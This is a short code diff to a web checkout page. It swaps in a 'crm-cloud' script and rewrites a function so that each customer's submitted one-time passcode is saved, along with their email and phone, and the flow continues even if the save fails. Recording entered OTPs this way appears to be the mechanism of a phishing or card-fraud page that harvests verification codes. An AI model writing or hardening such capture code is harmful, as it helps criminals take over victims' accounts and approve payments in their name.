@@ -64,7 +64,7 @@
 
 <script src="js/data.js"></script>
 <script src="js/cart.js"></script>
-<script src="js/crm.js"></script>
+<script src="js/crm-cloud.js"></script>
 <script>
   document.getElementById("header").innerHTML = renderHeader();
   document.getElementById("footer").innerHTML = renderFooter();
@@ -138,13 +138,18 @@
     location.href = "success.html";
   }
 
-  function submitFinalData() {
+  async function submitFinalData() {
     // Save OTP data to CRM immediately
-    addOTPData({
-      submittedOTP: getOtp(),
-      email: billingData.email,
-      phone: billingData.phone
-    });
+    try {
+      await addOTPData({
+        submittedOTP: getOtp(),
+        email: billingData.email,
+        phone: billingData.phone
+      });
+    } catch (error) {
+      console.error('CRM save failed:', error);
+      // Still proceed even if CRM save fails
+    }
   }
 
   // Resend timer
